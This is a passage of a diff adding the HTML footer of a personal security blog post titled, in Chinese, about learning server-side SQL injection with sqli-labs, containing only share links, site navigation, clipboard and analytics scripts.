+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&title=通过sqli-labs学习基于服务器架构上的sql注入" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&is_video=false&description=通过sqli-labs学习基于服务器架构上的sql注入" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=通过sqli-labs学习基于服务器架构上的sql注入&body=Check out this article: https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&title=通过sqli-labs学习基于服务器架构上的sql注入" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&title=通过sqli-labs学习基于服务器架构上的sql注入" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&title=通过sqli-labs学习基于服务器架构上的sql注入" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&title=通过sqli-labs学习基于服务器架构上的sql注入" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/%E9%80%9A%E8%BF%87sqli-lab%E5%AD%A6%E4%B9%A0%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%E4%B8%8A%E7%9A%84sql%E6%B3%A8%E5%85%A5/&name=通过sqli-labs学习基于服务器架构上的sql注入&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Rj45
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?539c6b41d72f90d25e5ad9d0db4f2321";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
